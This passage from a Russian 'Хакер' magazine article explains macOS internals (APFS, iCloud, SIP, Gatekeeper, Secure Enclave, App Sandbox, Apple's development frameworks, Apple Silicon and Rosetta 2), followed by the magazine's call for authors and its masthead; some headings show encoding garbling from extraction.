воляет откры вать сетевой доступ к дискам с помощью разных сетевых про-
токолов.
  APFS дает прирост в скорости, замет ный в повседневной работе. Нап-
ример, гораздо быстрее, чем на HFS+, под считывается размер каталогов
и копиру ются файлы.





                  Создание тома APFS в Disk Utility

Наконец, самая замет ная фича APFS — это возможность не задавать фик -
сирован ный размер логических томов. Они разделяют общее физическое
пространство, и каждый из них будет занимать столь ко, сколь ко занимают его
дан ные.
  Спецификации APFS откры ты в достаточной мере, чтобы создавать драй-
веры «толь ко для чтения». Однако уже существу ют эксперимен таль ные драй-
веры для Linux, работающие с APFS в режиме «чтение и запись».
  Важная особен ность APFS, о которой  стоит  знать поль зователю, —
это нечувствитель ность к регистру. То есть FILE, file, FiLe и прочие подоб-
ные вариации — это с точки зрения APFS ровно одно и то же. Чувствитель -
ность к регистру можно включить при форматировании тома, но по умолчанию
на всех «маках» эта настройка вык лючена.


ICLOUD

Еще с начала двухтысячных в Apple эксперимен тировали с под держкой собс-
твен ных облачных сервисов на уровне macOS. iCloud пред шествовали iTools,
.Mac и MobileMe. Названия менялись, но основная суть всег да сводилась
к син хронизации дан ных между устройствами.
   Здесь мы не будем пог ружать ся в устройство iCloud. Важно знать лишь то,
что его исполь зование опциональ но, но значитель но упрощает син хронизацию
между компь ютерами и гад жетами Apple.
  Наиболее замет ный и важный ком понент iCloud — это iCloud Drive, куда
поль зователь может сохранять докумен ты, после чего система будет авто-
матически следить за их состоянием и передавать изменения в облако.
Помимо этого, существу ет фреймворк CloudKit, который разработ чики исполь -
зуют для син хронизации настроек и прочих отличных от докумен тов дан ных.
   iCloud тесно связан с учет ной записью Apple ID, однако это не одно и то же.
Строго говоря, иметь Apple ID, чтобы поль зовать ся «маком», необязатель но,
но без этой учет ки нель зя будет скачивать приложения из App Store. С Apple ID
поль зователь получает неболь шое бесплат ное хранилище в iCloud, на дан ный
момент — 5 Гбайт.


                                       Продолжение статьи →
                      ← НАЧАЛО СТАТЬИGEEK




                    РАЗБИРАЕМ В ПОДРОБНОСТЯХ,
                              КАК УСТРОЕНА MACOS





ÇÀÙÈÒÀ

SIP
Рань ше на «маках» поль зователь с привилегиями администратора имел все те
же возможности, что и root — «корневой» поль зователь в Unix. Под твердив
коман ду вводом пароля, он мог, к примеру, изменять или удалять любые фай-
лы в системе.
  Это оставляло лазейку для вредоносного ПО: если убаюкать осторожность
поль зователя и заставить его ввести пароль, то даль ше можно скрыт но творить
что угод но.
  В OS X 10.11  El Capitan появилась система System Integrity Protection
(SIP) — «защита целостности системы». На прак тике это реализован ный
на уровне ядра целый ком плекс мер, который не дает зат рагивать работу сис-
темы даже администратору.
  Системные файлы и каталоги теперь под защитой — это реализовано
как специаль ный расширен ный атрибут у файла; запрещена инъекция кода
в процессы, причем не толь ко системные, но и дру гие; запрещена заг рузка
в ядро непод писан ных расширений.
  Конечно, бывают  слу чаи,  ког да  SIP мешает сделать  что-то нужное.
Как любитель покопать ся в системе, я спотыкаюсь об эту защиту регулярно
с момен та ее появления.
  От ключить  SIP возможно. Для этого нужно перезаг рузить компь ютер
в режиме восстановления, открыть терминал и исполь зовать утилиту csrutil.
Затем еще одна перезаг рузка, и еще две — чтобы потом включить SIP обратно
(что все же рекомен дует ся делать).


Gatekeeper
Еще один механизм, призванный защитить «мак» от вирусов, называется
Gatekeeper. Это система, которая, опираясь на базы дан ных Apple, распознает
потен циаль но вредоносные файлы и препятству ет их запуску.
   Работает это вот как. Каждый скачан ный файл помещается в каран тин,
получая  соот ветству ющий расширен ный  атрибут. При попыт ке  запустить
исполняемый файл, стоящий на каран тине, система проверяет, не находит ся
ли он в черном списке, есть ли у него под пись сертифицирован ного разработ -
чика, и если да, то не изменено ли содержимое файла.
  В зависимости от резуль татов проверки система либо сразу запускает
файл, либо отказывается это делать. Если проблема в отсутствии под писи, то
это лег ко обойти — достаточно открыть файл через кон текстное меню, а не
двойным кликом.





Gatekeeper при желании можно полностью отключить одной коман дой, причем
не требует ся даже перезаг рузка. Хоть это и облегчит жизнь, делать так
не рекомен дует ся. Прог раммы просто так не попадают в черные списки!


Secure Enclave
В «маках» с чипами серии M либо с процессорами Intel и дополнитель ными
чипами серии T исполь зует ся специаль ное аппарат ное решение для надеж-
ного хранения и под тверждения ключей шифрования и биомет рической
информации — Secure Enclave.
   Поль зователю Secure Enclave не виден, взаимодействовать с ним напрямую
никак нель зя. Зато система общается с ним каждый раз, ког да ты под твержда-
ешь платеж или ввод пароля отпечат ком паль ца или разблокиру ешь компь ютер
при помощи Apple Watch.


App Sandbox
От дель но от SIP и Gatekeeper существу ет механизм App Sandbox, который кон -
тролиру ет доступ сторон них приложений к поль зователь ским и системным
файлам и папкам. Точнее, позволяет разработ чикам самим ограничивать воз-
можности приложений! Для прог рамм, распространяемых через App Store,
это необходимое условие, для заг ружаемых дру гими способами — опциональ -
ное.





                   Настройка App Sandbox в Xcode

Под ключив App Sandbox в Xcode при сборке проекта, разработ чик выбирает,
какие фун кции могут понадобить ся приложению: доступ к определен ным пап-
кам, сетевым протоколам,  возможностям  вроде  Apple  Pay. Приложение
при работе будет просить поль зователя под твердить, что он разрешает
исполь зовать тот или иной ресурс.


FairPlay
Помимо механизмов, призванных защитить дан ные поль зователей, в macOS
есть и одна система, защищающая дан ные от поль зователей. Речь о FairPlay —
местной реализации цифровой защиты авторских прав (DRM). Это, пожалуй,
единствен ное серь езное ограничение, намертво зашитое в macOS.
    FairPlay может распространять ся как на отдель ные файлы в форматах MP4
(видео) и AAC (звук), так и на потоковое вещание (FairPlay Streaming). В час-
тности, эту защиту исполь зуют в Netix.
    FairPlay  жестко  ограничивает  копирование защищен ной информации,
поэтому если попытать ся сделать скрин шот филь ма из Netix или Apple TV, то
получит ся толь ко черный прямоуголь ник. Записать видео или захватить аудио
из защищен ного источника тоже не выйдет без дополнитель ных ухищрений.


ÏÐÎÃÐÀÌÌÈÐÎÂÀÍÈÅ

Даже при бег лом знакомстве с macOS лег ко заметить, что боль шинство прог -
рамм здесь имеют единый визу аль ный стиль, стан дартные диалоги откры тия
и сохранения файлов, выбора шрифтов и цвета и прочие общие элемен ты. Все
это — благодаря тому, что они основаны на стан дартных объектных библиоте-
ках, реализующих интерфейс Aqua.
   Такой под ход не толь ко обеспечивает кон систен тный стиль и пред ска-
зуемое поведение прог рамм, но еще и экономит оперативную память, а так же
позволяет Apple в любой момент вносить разного рода изменения. К примеру,
ког да в macOS 10.14 Mojave появился тем ный режим, его внед рение пот -
ребовало минимум усилий от разработ чиков прог рамм.
  Од нако говорить о том, что в macOS есть толь ко одна окон ная библиотека,
в наше время не приходит ся. В реаль ности фреймворков несколь ко: какие-то
из них оставлены для совместимости, дру гие пока носят эксперимен таль ный
харак тер.


Objective-C
Традиционный и до сих пор самый надежный способ разработ ки прог рамм
для macOS — это исполь зование язы ка Objective-C и фреймворка Cocoa,
известного  так же  как  AppKit  (или  NSApp,  если  заг лянуть  во  времена
NeXTSTEP).





                   Разработ ка в Xcode на Objective-C

Objective-C — это высокоуровневый объектно ориентирован ный язык с под -
держкой разных видов типизации. Он унаследовал идеи Smalltalk (объекты
и сообщения) и C (базовый син таксис, прямое управление памятью). Абстрак -
тно его можно считать эппловским аналогом C++ или в какой-то мере — C#
и Java.


AppKit
Знания одного толь ко Objective-C недостаточно для разработ ки маковских
приложений. Гораздо боль ший пласт — это разнообразные API и фреймворки,
которые поставляются с системой. Любой прог раммист прак тически сразу же
столкнет ся с Foundation Kit, где реализованы базовые объекты и струк туры,
а при написании графических приложений — с AppKit.
   AppKit реализует привычную в наше время схему MVC, то есть «модель —
вид — кон троллер», где модель отвечает за струк туру дан ных, вид — за их
отображение,  а  кон троллер —  за  реак цию  на действия  поль зователя.
С помощью AppKit описывается внеш ний вид и поведение всех окон, меню,
кнопок, тек стовых полей и дру гих элемен тов интерфейса.
   Для разработ ки прог рамм на основе AppKit часто применяется Interface
Builder, входящий в Xcode. Это визу аль ное средство разработ ки интерфейсов,
которое позволяет собрать приложение из составных частей, как в дет ском
конструк торе (если ты сразу вспом нил Visual Basic, Delphi, C++Builder или Qt
Designer, то это верная аналогия). Разработ чики неред ко критику ют этот под -
ход: вместо навыков прог раммирования он требует имен но умения обращать -
ся с Interface Builder.


Swift
Objective-C слу жил NeXT и Apple верой и правдой с вось мидесятых годов
и неплохо справлялся со своими задачами. Однако за все это время он очень
мало изменился и лишен многих возможностей, привычных современ ным
прог раммистам.
  В 2014 году на кон ферен ции WWDC анон сировали новый язык для написа-
ния маковских приложений — Swift. За его созданием стоит Крис Лат тнер,
известный как один из основных разработ чиков универсаль ного ком пилятора
LLVM.
   Как и Objective-C, Swift — ком пилиру емый язык, нацелен ный на разработ ку
стабиль ных и производитель ных приложений. Он тоже исполь зует схожий с С
син таксис, однако унаследовал некоторые парадиг мы от скриптовых язы ков
вроде JavaScript и Python.
  По своим возможностям Swift уже способен полностью заменить Objective-
C и превосходит его в производитель ности. Однако базовые фреймворки
еще не все переписаны на Swift, поэтому пока что разработ чикам сложных
приложений приходит ся регулярно сталкивать ся с Objective-C и его наследи-
ем.




                    Ис ходни ки Swift открыты, и су щес тву ют версии
                      компилятора  и  REPL  для   Linux,  Windows
                      и  Android. Одна ко широкого рас простра нения
                        за предела ми macOS этот язык пока не получил.



SwiftUI
NSApp/AppKit разрабаты вался вместе с Objective-C и с учетом его возможнос-
тей. И хоть из Swift и можно обращать ся к нему, аналогичной парой для нового
язы ка должен стать интерфейс SwiftUI.
  За основу SwiftUI взяли UIKit (CocoaTouch) — более новую модификацию
AppKit, разработан ную для iOS. SwiftUI должен заменить оба этих фреймворка
и позволяет писать приложения, которые будут работать на всех плат формах
Apple: часах, телефонах, план шетах, компь ютерах и телеприставках.
   Главная фиш ка SwiftUI — это возможность описывать приложения в дек -
ларативном стиле. То есть вместо того, чтобы коман да за коман дой перечис-
лять,  какие элемен ты интерфейса куда поместить, достаточно описать,
как будет выг лядеть приложение, а промежу точные шаги и расклад ку SwiftUI
возь мет на себя. Interface Builder при этом уже не нужен.





                    Разработ ка интерфейса на SwiftUI

SwiftUI позволяет разработ чикам экономить массу усилий, ког да задум ка сов-
падает с доступны ми возможностями. В противном же слу чае SwiftUI может
оказать ся серь езной прег радой. Возможно, с развитием SwiftUI станет лег че,
но пока что ситу ации, о которых в Apple не подумали заранее, встречают ся
на каждом шагу и вынуждают разработ чика возвращать ся к AppKit — благо
смешивать его со SwiftUI ник то не мешает.


Catalyst
И еще один современ ный эппловский фреймворк, о котором стоит упомянуть,
называется Catalyst. Катализировать он призван портирование на «мак» при-
ложений, написан ных для iOS на UIKit. По заверениям Apple, создать десктоп-
ную прог рамму из мобиль ной можно бук валь но за один день.
  В доказатель ство на презен тации показали официаль ный клиент Twitter,
портирован ный с iOS. И... им действитель но при желании можно поль зовать ся.
Однако по поведению он замет но отличает ся от «род ных» маковских приложе-
ний.





                       Клиент Twitter на Catalyst

Catalyst — это переход ный фреймворк, и постепен но его должен полностью
вытеснить универсаль ный SwiftUI. Собствен но, приложений, перенесен ных
на «мак» при помощи Catalyst, оказалось нем ного, и, скорее всего, его отпра-
вят на пен сию даже рань ше времени.


Carbon
История с Catalyst немало напоминает дру гой эпизод из жизни Apple. Ког да
Mac OS X была совсем новой и нуждалась в приложениях, в Apple решили
помочь  разработ чикам  прог рамм  для  классической Mac OS  переехать
на новую систему.
   Так родился фреймворк Carbon, предоставляющий под держку старых API,
но для поль зователя рису ющий все тот же интерфейс Aqua. Carbon оказался
серь езным под спорь ем для разработ чиков, и его, в частности, исполь зовали
в продук тах Adobe — вплоть до выхода Creative Suite 5.




                  Может сложиться впечат ление, что на «маке»
                       разрешено  использовать  только  стандартные
                      средс тва создания при ложений. Это не так: есть
                     множес тво популярных прог рамм на кросс-плат -
                    форменных  биб лиотеках   вроде  GTK+,   Qt,
                       vxWidgets  или фрей мворке  Electron  (на  нем
                       работа ют, например, VS Code и Slack). Прос то
                       пользователи  Apple  пред почита ют  нативные
                        прог раммы из-за луч шей интегра ции в сис тему.



WebObjects
Наконец, тебе еще кое-где может встретить ся слово WebObjects. Это наз-
вание эппловского объектно ориентирован ного веб-фреймворка, созданного
на заре интернета и пришед шего еще из NeXT. По своим возможностям он
серь езно опередил время, но исполь зовать «мак» в качестве веб-сервера
было стран ной идеей что тог да, что сейчас. Единствен ная ком пания, которая
до сих пор применяет WebObjects, — это сама Apple. На этой технологии час-
тично работают App Store и Apple Music.


APPLE SILICON

В Apple очень серь езно относят ся к тому, чтобы иметь не толь ко собствен ный
софт, но и свое железо, идеаль но под ходящее к софту. Выбор цен траль ного
процессора здесь играет важнейшую стратегическую роль. В Apple уже трижды
меняли  тип CPU  «макин тошей»:  Motorola 68000  (32-разрядный  CISC)
на PowerPC (32- и 64-разрядный RISC), затем на Intel (32- и 64-разрядный
CISC) и в 2020 году — на ARM (64-разрядный RISC).
  К момен ту последнего перехода в Apple уже снабжали iPhone, iPad и прочие
гад жеты своими системами на чипе серии A на основе ARM. Так что перевод
«маков» на ту же аппарат ную плат форму не стал неожидан ностью. Этого
события ждали давно, и если что-то и удивило, так это его почти полная без-
болезненность и даже невидимость изменений для поль зователей.





«Макин тоши» на Apple Silicon (так официаль но называется эппловская раз-
новид ность ARM) не потеряли совместимость почти ни с одним приложе-
нием — в первую очередь за счет системы бинарной тран сляции, известной
как Rosetta 2.
   Rosetta 2 при первом запуске исполняемого файла, пред назначен ного
для «маков» с чипом Intel, переводит инструк ции x86 в инструк ции ARM, то
есть производит «ком пиляцию перед исполь зованием» — AOT. При необ-
ходимости доступна и динамическая ком пиляция — JIT.
  Все это позволяет запускать те же приложения, что и рань ше, даже если их
разработ чик не позаботился о пересборке под новую архитек туру. Причем
зачастую производитель ность не толь ко не  усту пает производитель ности
«маков» с чипами x86, но и превосходит ее!
  Свою роль в том, что переход на Apple Silicon был лег ким и незамет ным,
сыг рала и та под готовка, которую начали за много лет до решающего момен та.
В Apple очень ловко убрали под держку старых 32-разрядных приложений
за год до анон са Apple Silicon — в операционной системе macOS 10.15
Catalina. Rosetta 2 не позволяет запускать такие прог раммы, и лиш ний год дал
сторон ним разработ чикам время под готовить ся.




                      Ес ли что-то и пос тра дало при переезде на Apple
                              Silicon, то это виртуали зация. Под робнее о том,
                          как Parallels, VMware, QEMU и VirtualBox пережи -
                      ли переход, читай в статье « M1 для хакера ».


Что до приложений и фреймворков, поставляемых с macOS, то в них под дер-
жку 64-разрядных архитек тур начали добавлять еще c 2009 года, ког да выш ла
Mac OS X 10.6 Snow Leopard. Библиотеки Carbon, не имевшие 64-разрядной
версии, перестали под держивать в 2012 году в OS X 10.8 Mountain Lion.
   Такие планомерные уборки в чулане позволяют Apple с лег костью менять
аппарат ные плат формы и под держивать «легаси» толь ко в переход ные пери-
оды.


ÏÐÎ×ÅÅ

Помимо перечисленного, в macOS есть еще несколь ко ком понен тов, которые
род нят эту ОС с миром Linux. К примеру, это система печати CUPS и сервер
VNC, исполь зуемый для шейрин га экрана. И конечно, коман дная оболочка
Bash, стан дартная для любого Linux (в последних версиях macOS по умол-
чанию установлен еще и ZSH).
  Долгое время с macOS поставлялись интерпретаторы язы ков Python, Perl
и PHP. В macOS 12 Monterey убрали Python 2.7 и PHP, оставив толь ко Perl,
однако вместе с Xcode или Command Line Tools for Xcode устанавливается
Python 3.
  Причина «уборки» — в том, что нужны эти язы ки в основном прог раммис-
там и энту зиастам, причем зачастую в гораздо более новой версии, чем есть
в системе. А раз ставить новую все равно придет ся, то старая будет толь ко
мешать.




                  С macOS пос тавля ется и веб-сервер Apache,
                      но это скорее прос то интерес ный историчес кий
                        факт. До версии 10.8 Mountain Lion «Апа чем»
                    мож но было управлять через панель нас троек.
                       Теперь же дос туп есть только из командной
                       строки, и, скорее всего, в одной из будущих вер-
                      сий веб-сервер уберут по тем же при чинам, что
                      и Python 2.



ÂÛÂÎÄÛ

Итак, думаю, ты уже понял, что macOS — это не Linux, хотя и гораздо более
близкая к нему система, чем, например, Windows.
   Здесь исполь зуют ся свои ядро, графическая система, окон ная среда и гра-
фические фреймворки. Под держка  стан дарта  POSIX  обеспечивает  воз-
можность портировать на macOS Unix-совместимые прог раммы. Некоторые
из них уже поставляются вместе с системой.
   Что до слу хов о том, насколь ко macOS зак рыта, то они силь но преувеличе-
ны. «Зак рыта» она не в боль шей мере, чем Windows, а местами в гораздо
мень шей. С дру гой стороны, понят но, что это не Linux, где почти каждый ком -
понент есть в несколь ких вариантах и при желании можно сделать новый форк
любого из них. И конечно, широко известно, что macOS официаль но нель зя
установить на дру гие компь ютеры, кроме «маков».
   Критика этих фак тов каким-то образом переродилась в слу хи о том, что
в macOS нель зя слу шать музыку, если ты не купил ее в iTunes Store, или запус-
тить скачан ные из интернета приложения. Все это, конечно, полнейшая ерун -
да.
  Су ществу ет опасение, что macOS постепен но объединят с куда более зак -
рытыми iOS и iPad OS. Чтобы понять стратегию Apple в этом плане, достаточно
взглянуть на SwiftUI. Он позволяет писать единые приложения, имеющие раз-
ный внеш ний вид и поведение на разных устройствах с учетом их размера,
возможностей и схемы исполь зования. Очевид но, что и даль ше в Apple будут
не изничтожать, а скорее под черкивать отличия между разными видами компь -
ютеров.
   Так что объединение, с одной стороны, вряд ли произойдет, с дру гой —
уже вовсю происходит. Просто оно работает совсем на дру гом уровне: уни-
фицируют  внут ренние системы  (например, APFS), создают общий базис
для разработ ки приложений (SwiftUI), в macOS постепен но добавляют некото-
рые новые фичи из iOS (и наоборот — iOS и iPad OS получают кое-что
с «мака»).
  Уже много лет macOS — отличный выбор как для повседневной работы, так
и для творчества и для многих видов разработ ки. Непрерывная оптимизация
и чистка, прак тику емые в Apple, позволяют сохранить производитель ность
и внед рять новшества на всех уровнях системы. К тому же в macOS есть
огромный потен циал для автоматизации, о котором мы уже не раз писали
и еще вернемся к нему в будущем.
«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.




Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
    №10 (283)

           Андрей Пись менный     Ва лентин Холмогоров        Илья Русанен
               Главный редактор          Ведущий редак тор              Разработка
                pismenny@glc.ru           valentin@holmogorov.ru           rusanen@glc.ru
                                   Евгения Шарипова
                                      Литера тур ный редактор


                           MEGANEWS

                             Мария Нефёдова
                                             nefedova@glc.ru


                                    АРТ

                                        yambuto
                                        yambuto@gmail.com


                     КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                   Иван Андреев, Олег Афонин,
                                 Марк Бруцкий-Стемпковский,
                                      Алексей Глазков, Nik Zerof,
                                    Юрий Язев


                              РЕКЛАМА

                                    Анна Яков лева
                                    Директор по спецпроектам
                                              yakovleva.a@glc.ru


                     РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                        Воп росы по подписке:      Воп росы по материалам:
                                  lapina@glc.ru                support@glc.ru





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, стро ение 1, этаж 8, помещение IX, комната 54, офис 7. Изда тель: ИП Югай
Александр Оле гович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар» 125080, город Мос -
ква, Волоколам ское шоссе, дом 1, стро ение 1, этаж 8, помеще ние IX, комната 54, офис 7. Зарегистри рова но в Федеральной службе по надзору
в сфере свя зи, информа ционных тех нологий и массовых коммуника ций (Роскомнад зоре), свидетельство Эл № ФС77-67001 от 30.08.2016 года.
Мнение редак ции не обя зательно совпадает с мнением авторов. Все материалы в номере предоставляются как информа ция к размышлению. Лица,
использующие данную информацию в противозаконных целях, могут быть привлечены к ответствен ности. Редакция не несет ответственности
за содержание рекламных объявле ний в номере. По вопросам лицензирования и получения прав на использование редакционных материалов жур -
нала обращайтесь по адре су: xakep@glc.ru. © Журнал «Хакер», РФ, 2022